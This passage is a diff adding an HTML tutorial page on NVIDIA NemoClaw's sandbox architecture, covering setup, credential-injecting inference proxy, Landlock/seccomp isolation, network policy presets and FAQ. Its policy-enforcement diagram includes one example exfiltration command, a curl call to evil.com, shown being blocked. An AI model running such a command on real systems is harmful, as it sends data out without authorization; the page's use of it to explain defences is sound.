+<span class="hl-dim">║</span>  <span class="hl-yellow">└─────────────────────────┘</span>                                   <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>                                                                  <span class="hl-dim">║</span>
+<span class="hl-dim">╚══════════════════════════════════════════════════════════════════╝</span></pre>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="interfaces">Six Communication Interfaces</h2>
+
+<pre class="diagram"><span class="hl-red">OpenClaw</span> ◄──<span class="hl-dim">①</span>──▶ <span class="hl-green">NemoClaw Plugin</span>      Plugin API (register, registerCli, registerProvider)
+                         │
+                    <span class="hl-dim">②</span>    │ subprocess        stdout protocol: PROGRESS:N:label, RUN_ID:id
+                         ▼
+                  <span class="hl-green">NemoClaw Blueprint</span>
+                    │            │
+               <span class="hl-dim">③</span>   │            │ <span class="hl-dim">④</span>        ③ openshell CLI    ④ docker CLI (NIM only)
+                    ▼            ▼
+              <span class="hl-blue">OpenShell</span>      <span class="hl-pink">Docker</span>
+                    │                          ⑤ OpenShell uses Docker internally
+               <span class="hl-dim">⑤</span>   │
+                    ▼
+              <span class="hl-pink">Docker</span> (sandbox container)
+                    │
+               <span class="hl-dim">⑥</span>   │                          ⑥ Transparent network proxy at runtime
+                    ▼
+              <span class="hl-red">OpenClaw</span> (inside sandbox) ──▶ <span class="hl-yellow">NVIDIA API</span></pre>
+
+<table>
+  <tr><th>#</th><th>Interface</th><th>Mechanism</th><th>Source File</th></tr>
+  <tr><td>①</td><td>NemoClaw ↔ OpenClaw</td><td>Plugin API (TypeScript)</td><td><code>nemoclaw/src/index.ts:179</code></td></tr>
+  <tr><td>②</td><td>NemoClaw TS ↔ Python</td><td>Subprocess + stdout protocol</td><td><code>nemoclaw/src/blueprint/exec.ts:58</code></td></tr>
+  <tr><td>③</td><td>NemoClaw ↔ OpenShell</td><td>CLI commands (<code>openshell ...</code>)</td><td><code>orchestrator/runner.py:169</code></td></tr>
+  <tr><td>④</td><td>NemoClaw ↔ Docker</td><td>CLI commands (<code>docker ...</code>)</td><td><code>bin/lib/nim.js:124-172</code></td></tr>
+  <tr><td>⑤</td><td>OpenShell ↔ Docker</td><td>Internal (docker run/exec/rm)</td><td>Inside OpenShell</td></tr>
+  <tr><td>⑥</td><td>OpenShell ↔ OpenClaw</td><td>Transparent network proxy</td><td>Runtime (no NemoClaw code)</td></tr>
+</table>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="setup-flow">Setup Flow: <code>nemoclaw onboard</code></h2>
+
+<ol class="flow-steps">
+  <li><span class="actor">NemoClaw→Docker</span> Check Docker is running (<code>docker info</code>)</li>
+  <li><span class="actor">NemoClaw</span> Check OpenShell is installed (<code>openshell --version</code>); install if missing</li>
+  <li><span class="actor">NemoClaw→Docker</span> Check cgroup v2 config (<code>/etc/docker/daemon.json</code>)</li>
+  <li><span class="actor">NemoClaw</span> Detect GPU hardware (<code>nvidia-smi</code> or <code>system_profiler</code>)</li>
+  <li><span class="actor">NemoClaw→OpenShell→Docker</span> Start gateway: <code>openshell gateway start</code> → Docker creates k3s container</li>
+  <li><span class="actor">NemoClaw→Docker</span> Stage build context: copy Dockerfile + plugin + blueprint + scripts</li>
+  <li><span class="actor">NemoClaw→OpenShell→Docker</span> Create sandbox: <code>openshell sandbox create --from Dockerfile</code> → Docker builds image + starts container with Landlock/seccomp/netns</li>
+  <li><span class="actor">NemoClaw</span> Prompt for NVIDIA API key → save to <code>~/.nemoclaw/credentials.json</code> (mode 0600)</li>
+  <li><span class="actor">NemoClaw→OpenShell</span> Create provider: <code>openshell provider create --credential ...</code></li>
+  <li><span class="actor">NemoClaw→OpenShell</span> Set inference route: <code>openshell inference set --provider nvidia-nim</code></li>
+  <li><span class="actor">OpenClaw</span> OpenClaw starts inside sandbox with NemoClaw plugin pre-installed</li>
+  <li><span class="actor">NemoClaw→OpenShell</span> Apply policy presets: <code>openshell policy set</code> for pypi, npm, etc.</li>
+  <li><span class="actor">NemoClaw→OpenShell→Docker</span> Port forward: <code>openshell forward start --background 18789</code></li>
+</ol>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="runtime-flow">Runtime Flow: Inference Request</h2>
+
+<pre class="diagram"><span class="hl-red">OpenClaw agent</span>              <span class="hl-blue">OpenShell proxy</span>            <span class="hl-green">NVIDIA Cloud API</span>
+     │                            │                          │
+     │  POST inference.local/v1   │                          │
+     │  <span class="hl-dim">(no auth header)</span>          │                          │
+     │───────────────────────────▶│                          │
+     │                            │                          │
+     │                            │  <span class="hl-yellow">1. Intercept request</span>    │
+     │                            │  <span class="hl-yellow">2. Look up provider</span>     │
+     │                            │  <span class="hl-yellow">3. Inject credentials</span>   │
+     │                            │  <span class="hl-yellow">4. Rewrite URL</span>          │
+     │                            │  <span class="hl-yellow">5. Check network policy</span> │
+     │                            │                          │
+     │                            │  POST integrate.api.     │
+     │                            │  nvidia.com/v1           │
+     │                            │  Authorization: Bearer   │
+     │                            │  nvapi-*****             │
+     │                            │─────────────────────────▶│
+     │                            │                          │
+     │                            │  200 OK + response       │
+     │                            │◀─────────────────────────│
+     │                            │                          │
+     │  200 OK + response         │                          │
+     │◀───────────────────────────│                          │
+     │                            │                          │
+     │  <span class="hl-teal">Agent never sees the</span>     │                          │
+     │  <span class="hl-teal">API key or real endpoint</span>  │                          │</pre>
+<p class="diagram-caption">Figure 3: Inference request flow — credentials injected transparently by OpenShell's proxy</p>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="policy-flow">Policy Enforcement Flow</h2>
+
+<pre class="diagram"><span class="hl-red">Agent tries:</span>  curl https://evil.com/exfiltrate
+     │
+     ▼
+<span class="hl-blue">Network namespace</span> (sandbox-scoped)
+     │
+     │  Is evil.com in the policy?  ──▶  <span class="hl-red">NO</span>
+     │
+     ▼
+<span class="hl-red">REQUEST BLOCKED</span>
+     │
+     ├──▶ Logged to <span class="hl-blue">OpenShell TUI</span> (<code>openshell term</code>)
+     │
+     └──▶ Operator sees: "<span class="hl-yellow">evil.com:443 DENIED</span>"
+          Operator can:
+            • <span class="hl-green">Approve</span> (one-time, current session)
+            • <span class="hl-green">Add to policy</span> (permanent)
+            • <span class="hl-red">Deny</span> (keep blocked)
+
+<span class="hl-dim">─────────────────────────────────────────────────────────────────</span>
+
+<span class="hl-green">Agent tries:</span>  pip install requests  (reaches pypi.org)
+     │
+     ▼
+<span class="hl-blue">Network namespace</span> (sandbox-scoped)
+     │
+     │  Is pypi.org in the policy?  ──▶  <span class="hl-green">YES</span> (pypi preset applied)
+     │
+     ▼
+<span class="hl-green">REQUEST ALLOWED</span>  ──▶  pip installs successfully</pre>
+<p class="diagram-caption">Figure 4: Network policy enforcement — deny by default, allow only declared endpoints</p>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="migration-flow">Migration Flow</h2>
+
+<pre class="diagram"><span class="hl-green">openclaw nemoclaw migrate</span>
+     │
+     ▼
+<span class="hl-yellow">Detect</span> host OpenClaw           ~/.openclaw/ + config + workspaces
+     │                          + extensions + skills + external roots
+     ▼
+<span class="hl-yellow">Resolve + Verify</span> blueprint     Cache or OCI registry → SHA-256 check
+     │
+     ▼
+<span class="hl-yellow">Plan + Apply</span>                   Create sandbox via openshell CLI
+     │
+     ▼
+<span class="hl-yellow">Snapshot</span>                       tar archives preserving symlinks
+     │                          Manifest with path mappings
+     ▼
+<span class="hl-yellow">Sync</span> into sandbox              openshell sandbox cp → tar -xf
+     │
+     ▼
+<span class="hl-yellow">Verify</span>                         Node.js script runs INSIDE sandbox
+     │                          Checks: state dir, config paths,
+     │                          external roots, symlinks
+     ▼
+<span class="hl-yellow">Save state</span>                     ~/.nemoclaw/state/nemoclaw.json
+
+<span class="hl-dim">Rollback available via:</span>  <span class="hl-teal">openclaw nemoclaw eject --confirm</span></pre>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="security-model">Defense-in-Depth Security Model</h2>
+
+<p>NemoClaw uses five independent security layers. Even if one layer is compromised, the others still protect:</p>
+
+<div class="security-stack">
+  <div class="security-layer layer-5">
+    <h4>Layer 5: Inference Routing</h4>
+    <p>All model calls routed through OpenShell gateway. Agent never sees API keys. Configurable per-provider, hot-reloadable.</p>
+  </div>
+  <div class="security-layer layer-4">
+    <h4>Layer 4: Network Policy</h4>
+    <p>Declarative YAML allowlist. Per-endpoint host/port/method/path rules. Per-binary restrictions. Hot-reloadable. <em>Source: <code>openclaw-sandbox.yaml</code></em></p>
+  </div>
+  <div class="security-layer layer-3">
+    <h4>Layer 3: Process Isolation</h4>
+    <p>Runs as unprivileged <code>sandbox</code> user. seccomp syscall filtering blocks dangerous operations. No root capabilities.</p>
+  </div>
+  <div class="security-layer layer-2">
+    <h4>Layer 2: Filesystem Isolation (Landlock)</h4>
+    <p>Read-only: <code>/usr</code>, <code>/lib</code>, <code>/proc</code>, <code>/app</code>, <code>/etc</code>. Read-write: <code>/sandbox</code>, <code>/tmp</code>. All other paths denied.</p>
+  </div>
+  <div class="security-layer layer-1">
+    <h4>Layer 1: Container Isolation (Docker)</h4>
+    <p>Network namespace, PID namespace, UID/GID restrictions. Provides the baseline isolation that all other layers build on.</p>
+  </div>
+</div>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="network-policies">Network Policies</h2>
+
+<p>The base policy in <code>openclaw-sandbox.yaml</code> declares which endpoints the sandbox can reach. Each policy entry specifies host, port, allowed HTTP methods, and which binaries can use it:</p>
+
+<pre class="diagram"><span class="hl-yellow">network_policies:</span>
+  <span class="hl-green">nvidia:</span>
+    endpoints:
+      - host: <span class="hl-teal">integrate.api.nvidia.com</span>
+        port: <span class="hl-blue">443</span>
+        rules:
+          - allow: { method: <span class="hl-green">"*"</span>, path: <span class="hl-green">"/**"</span> }
+    binaries:
+      - { path: <span class="hl-pink">/usr/local/bin/claude</span> }
+      - { path: <span class="hl-pink">/usr/local/bin/openclaw</span> }
+
+  <span class="hl-green">github:</span>
+    endpoints:
+      - host: <span class="hl-teal">github.com</span>
+        port: <span class="hl-blue">443</span>
+        access: full
+    binaries:
+      - { path: <span class="hl-pink">/usr/bin/gh</span> }
+      - { path: <span class="hl-pink">/usr/bin/git</span> }</pre>
+
+<h4>Available Policy Presets</h4>
+<table>
+  <tr><th>Preset</th><th>Endpoints Allowed</th><th>Use Case</th></tr>
+  <tr><td><code>slack</code></td><td>slack.com, api.slack.com, hooks.slack.com</td><td>Slack notifications</td></tr>
+  <tr><td><code>discord</code></td><td>discord.com, cdn.discordapp.com</td><td>Discord webhooks</td></tr>
+  <tr><td><code>jira</code></td><td>*.atlassian.net</td><td>Issue management</td></tr>
+  <tr><td><code>telegram</code></td><td>api.telegram.org</td><td>Bot interactions</td></tr>
+  <tr><td><code>pypi</code></td><td>pypi.org, files.pythonhosted.org</td><td>pip install</td></tr>
+  <tr><td><code>npm</code></td><td>registry.npmjs.org</td><td>npm install</td></tr>
+  <tr><td><code>huggingface</code></td><td>huggingface.co, cdn-lfs.huggingface.co</td><td>Model downloads</td></tr>
+  <tr><td><code>docker</code></td><td>registry-1.docker.io, auth.docker.io</td><td>Docker Hub access</td></tr>
+</table>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="credential-injection">Credential Injection</h2>
+
+<pre class="diagram"><span class="hl-green">User provides API key</span>
+     │
+     ▼
+Stored in <span class="hl-yellow">~/.nemoclaw/credentials.json</span> (mode 0600)
+     │
+     ▼
+Passed to <span class="hl-blue">openshell provider create --credential "NVIDIA_API_KEY=nvapi-..."</span>
+     │
+     ▼
+<span class="hl-blue">OpenShell</span> stores credential in its own secure config
+     │
+     ▼
+<span class="hl-teal">When sandbox makes inference request:</span>
+  1. Request goes to https://inference.local/v1  (inside sandbox)
+  2. <span class="hl-blue">OpenShell proxy</span> intercepts
+  3. Proxy injects <span class="hl-green">Authorization: Bearer &lt;key&gt;</span>
+  4. Proxy forwards to real endpoint
+  5. Response returns to sandbox
+
+<span class="hl-red">The sandbox NEVER sees the actual API key.</span></pre>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="fs-isolation">Filesystem Isolation</h2>
+
+<table>
+  <tr><th>Path</th><th>Access</th><th>Contents</th></tr>
+  <tr><td><code>/sandbox</code></td><td style="color:#48bb78;font-weight:700">Read-Write</td><td>Agent home directory, OpenClaw state, workspaces</td></tr>
+  <tr><td><code>/tmp</code></td><td style="color:#48bb78;font-weight:700">Read-Write</td><td>Temporary files</td></tr>
+  <tr><td><code>/dev/null</code></td><td style="color:#48bb78;font-weight:700">Read-Write</td><td>Null device</td></tr>
+  <tr><td><code>/usr</code>, <code>/lib</code></td><td style="color:#4299e1;font-weight:700">Read-Only</td><td>System binaries and libraries</td></tr>
+  <tr><td><code>/proc</code></td><td style="color:#4299e1;font-weight:700">Read-Only</td><td>Process information</td></tr>
+  <tr><td><code>/etc</code></td><td style="color:#4299e1;font-weight:700">Read-Only</td><td>System configuration</td></tr>
+  <tr><td><code>/app</code></td><td style="color:#4299e1;font-weight:700">Read-Only</td><td>Application files</td></tr>
+  <tr><td>Everything else</td><td style="color:#e53e3e;font-weight:700">Denied</td><td>Blocked by Landlock</td></tr>
+</table>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="file-map">Key File Map</h2>
+
+<table>
+  <tr><th>File</th><th>Layer</th><th>Purpose</th></tr>
+  <tr><td><code>bin/nemoclaw.js</code></td><td>Host CLI</td><td>Entry point, command dispatcher</td></tr>
+  <tr><td><code>bin/lib/onboard.js</code></td><td>Host CLI</td><td>7-step interactive setup wizard</td></tr>
+  <tr><td><code>bin/lib/nim.js</code></td><td>Host CLI</td><td>NIM Docker container lifecycle</td></tr>
+  <tr><td><code>bin/lib/credentials.js</code></td><td>Host CLI</td><td>API key storage (mode 0600)</td></tr>
+  <tr><td><code>bin/lib/policies.js</code></td><td>Host CLI</td><td>Network policy preset management</td></tr>
+  <tr><td><code>nemoclaw/src/index.ts</code></td><td>Plugin</td><td>Plugin registration + provider catalog</td></tr>
+  <tr><td><code>nemoclaw/src/cli.ts</code></td><td>Plugin</td><td>Commander.js subcommand wiring</td></tr>
+  <tr><td><code>nemoclaw/src/commands/launch.ts</code></td><td>Plugin</td><td>Fresh bootstrap (resolve→verify→plan→apply)</td></tr>
+  <tr><td><code>nemoclaw/src/commands/migrate.ts</code></td><td>Plugin</td><td>Host→sandbox migration</td></tr>
+  <tr><td><code>nemoclaw/src/commands/eject.ts</code></td><td>Plugin</td><td>Rollback to host installation</td></tr>
+  <tr><td><code>nemoclaw/src/blueprint/exec.ts</code></td><td>Plugin</td><td>Python subprocess runner</td></tr>
+  <tr><td><code>nemoclaw/src/blueprint/verify.ts</code></td><td>Plugin</td><td>SHA-256 digest + version check</td></tr>
+  <tr><td><code>orchestrator/runner.py</code></td><td>Blueprint</td><td>Plan/apply/status/rollback via openshell</td></tr>
+  <tr><td><code>blueprint.yaml</code></td><td>Blueprint</td><td>Version, profiles, compatibility</td></tr>
+  <tr><td><code>policies/openclaw-sandbox.yaml</code></td><td>Blueprint</td><td>Base security policy</td></tr>
+  <tr><td><code>Dockerfile</code></td><td>Build</td><td>Sandbox container image recipe</td></tr>
+</table>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="data-models">State &amp; Data Models</h2>
+
+<h4>Plugin State — <code>~/.nemoclaw/state/nemoclaw.json</code></h4>
+<pre class="diagram">{
+  <span class="hl-green">"lastRunId"</span>:          <span class="hl-yellow">"nc-20260315-143022-a1b2c3d4"</span>,
+  <span class="hl-green">"lastAction"</span>:         <span class="hl-yellow">"migrate"</span>,     <span class="hl-dim">// launch | migrate | eject</span>
+  <span class="hl-green">"blueprintVersion"</span>:   <span class="hl-yellow">"0.1.0"</span>,
+  <span class="hl-green">"sandboxName"</span>:        <span class="hl-yellow">"openclaw"</span>,
+  <span class="hl-green">"migrationSnapshot"</span>:  <span class="hl-yellow">"~/.nemoclaw/snapshots/2026-03-15T..."</span>,
+  <span class="hl-green">"updatedAt"</span>:          <span class="hl-yellow">"2026-03-15T14:30:22.000Z"</span>
+}</pre>
+
+<h4>Sandbox Registry — <code>~/.nemoclaw/sandboxes.json</code></h4>
+<pre class="diagram">{
+  <span class="hl-green">"defaultSandbox"</span>: <span class="hl-yellow">"my-assistant"</span>,
+  <span class="hl-green">"sandboxes"</span>: [{
+    <span class="hl-green">"name"</span>:       <span class="hl-yellow">"my-assistant"</span>,
+    <span class="hl-green">"model"</span>:      <span class="hl-yellow">"nvidia/nemotron-3-super-120b-a12b"</span>,
+    <span class="hl-green">"provider"</span>:   <span class="hl-yellow">"nvidia-nim"</span>,
+    <span class="hl-green">"gpuEnabled"</span>: <span class="hl-blue">false</span>,
+    <span class="hl-green">"policies"</span>:   [<span class="hl-yellow">"pypi"</span>, <span class="hl-yellow">"npm"</span>]
+  }]
+}</pre>
+
+<h4>Blueprint Manifest — <code>blueprint.yaml</code></h4>
+<pre class="diagram"><span class="hl-green">version</span>: <span class="hl-yellow">"0.1.0"</span>
+<span class="hl-green">min_openshell_version</span>: <span class="hl-yellow">"0.1.0"</span>
+<span class="hl-green">min_openclaw_version</span>:  <span class="hl-yellow">"2026.3.0"</span>
+
+<span class="hl-green">profiles</span>: [default, ncp, nim-local, vllm]
+
+<span class="hl-green">components</span>:
+  <span class="hl-blue">sandbox</span>:
+    image: <span class="hl-yellow">"ghcr.io/.../openclaw:latest"</span>
+    forward_ports: [18789]
+  <span class="hl-blue">inference</span>:
+    profiles:
+      default:
+        endpoint: <span class="hl-yellow">"https://integrate.api.nvidia.com/v1"</span>
+        model:    <span class="hl-yellow">"nvidia/nemotron-3-super-120b-a12b"</span></pre>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="faq">FAQ</h2>
+
+<div class="card">
+  <h4>Can I use OpenClaw without NemoClaw?</h4>
+  <p>Yes. OpenClaw works standalone. But it runs unsandboxed with full host access.</p>
+</div>
+
+<div class="card">
+  <h4>Can I use OpenShell without Docker?</h4>
+  <p>No. OpenShell's gateway is a Docker container running k3s. Sandboxes are Docker containers. Docker is a hard requirement.</p>
+</div>
+
+<div class="card">
+  <h4>Why does NemoClaw talk to Docker both directly AND through OpenShell?</h4>
+  <p><strong>Through OpenShell</strong>: for sandboxes (need security layers). <strong>Directly</strong>: for NIM containers (trusted services that don't need sandboxing).</p>
+</div>
+
+<div class="card">
+  <h4>How many Docker containers run after setup?</h4>
+  <p><strong>2</strong> (cloud inference): OpenShell gateway + sandbox. <strong>3</strong> (local NIM): + NIM model server.</p>
+</div>
+
+<div class="card">
+  <h4>Where does NemoClaw end and OpenShell begin?</h4>
+  <p>NemoClaw builds CLI arguments and calls <code>openshell</code>. Everything before the <code>openshell</code> command is NemoClaw's logic. Everything after is OpenShell's.</p>
+</div>
+
+<div class="card">
+  <h4>Which project handles security at runtime?</h4>
+  <p><strong>OpenShell</strong> enforces (Landlock, seccomp, proxy). <strong>NemoClaw</strong> configured it at setup time. <strong>OpenClaw</strong> is the thing being secured.</p>
+</div>
+
+<div class="card">
+  <h4>What happens if the agent tries to reach an unlisted host?</h4>
+  <p>OpenShell blocks the request and surfaces it in the TUI (<code>openshell term</code>). The operator can approve once, add permanently, or deny.</p>
+</div>
+
+<footer>
+  <p>NemoClaw Tutorial — Based on <a href="https://github.com/NVIDIA/NemoClaw">NVIDIA NemoClaw</a> (Apache-2.0)<br>
+  Tutorial docs: <a href="https://github.com/az9713/nemoclaw-tutorial">az9713/nemoclaw-tutorial</a></p>
+</footer>
+
+</main>
+
+<!-- ── Scroll-spy for TOC highlighting ─────────────── -->
+<script>
+(function() {
+  const links = document.querySelectorAll('#toc a[href^="#"]');
+  const sections = [];
+  links.forEach(link => {
+    const id = link.getAttribute('href').slice(1);
+    const el = document.getElementById(id);
+    if (el) sections.push({ link, el });
+  });
+
+  function update() {
+    let current = sections[0];
+    const offset = window.scrollY + 120;
+    for (const s of sections) {
+      if (s.el.offsetTop <= offset) current = s;
+    }
+    links.forEach(l => l.classList.remove('active'));
+    if (current) current.link.classList.add('active');
+  }
+
+  window.addEventListener('scroll', update, { passive: true });
+  update();
+
+  // Close mobile TOC on link click
+  links.forEach(link => {
+    link.addEventListener('click', () => {
+      document.getElementById('toc').classList.remove('open');
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
